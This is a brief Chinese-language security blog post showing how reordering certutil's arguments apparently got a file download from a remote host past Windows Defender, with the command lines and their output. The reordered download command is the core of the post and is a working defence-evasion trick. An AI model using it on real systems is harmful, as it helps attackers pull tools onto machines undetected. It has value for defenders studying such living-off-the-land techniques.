---
title: certutil_bypassWindows Defender
date: 2018-10-03 09:56:03
tags: windows
categories: windows
---
![enter description here][1]
<!--more-->
参数拦截

``` stylus
C:\Users\demon>certutil -urlcache -split -f http://192.168.10.125/1.txt
拒绝访问。

C:\Users\demon>certutil  -split -urlcache -f http://192.168.10.125/1.txt
****  联机  ****
  0000  ...
  0016
CertUtil: -URLCache 命令成功完成。
```
![enter description here][2]

![enter description here][3]
https://twitter.com/lampnout/status/1047122224581419009

  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181003_095413.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1538531958327.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1538531971508.jpg 